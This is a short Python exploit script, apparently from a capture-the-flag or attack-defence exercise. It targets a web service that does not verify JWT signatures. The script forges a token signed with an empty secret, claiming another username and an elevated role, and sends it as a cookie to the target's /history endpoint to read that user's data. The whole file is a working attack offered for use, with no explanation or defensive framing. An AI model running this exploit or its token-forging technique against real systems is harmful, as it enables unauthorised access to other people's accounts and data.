#!/usr/bin/env python3
import argparse, requests, time, jwt

#START ME LIKE ./1.py 127.0.0.1 8181

def no_jwt_checks(ip, port):
    encoded_jwt = jwt.encode({"exp": int(time.time())+300,"username": "user2", "role": 1}, "", algorithm='HS256')
    print(encoded_jwt)
    try:
        r = requests.get(f"http://{ip}:{port}/history",cookies={"token":encoded_jwt})
        print(r.text)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit the fourth vulnerability no jwt checks")
    parser.add_argument("ip", help="vulnerable host ip passed here")
    parser.add_argument("port", help="port to web")
    args = parser.parse_args()
    no_jwt_checks(args.ip, int(args.port))
